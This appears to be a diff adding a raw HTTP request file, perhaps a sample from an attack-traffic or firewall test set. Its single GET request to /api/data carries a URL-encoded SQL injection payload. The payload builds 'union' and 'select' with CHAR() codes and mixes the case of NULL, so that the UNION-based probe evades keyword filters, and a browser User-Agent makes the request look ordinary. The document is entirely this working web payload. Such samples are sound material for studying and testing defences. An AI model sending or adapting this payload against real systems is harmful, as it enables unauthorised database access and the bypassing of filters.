@@ -1,0 +1,6 @@
+GET /api/data?value=%27%20CHAR%28117%2C110%2C105%2C111%2C110%29%20CHAR%28115%2C101%2C108%2C101%2C99%2C116%29%20nULL%2CNull-- HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
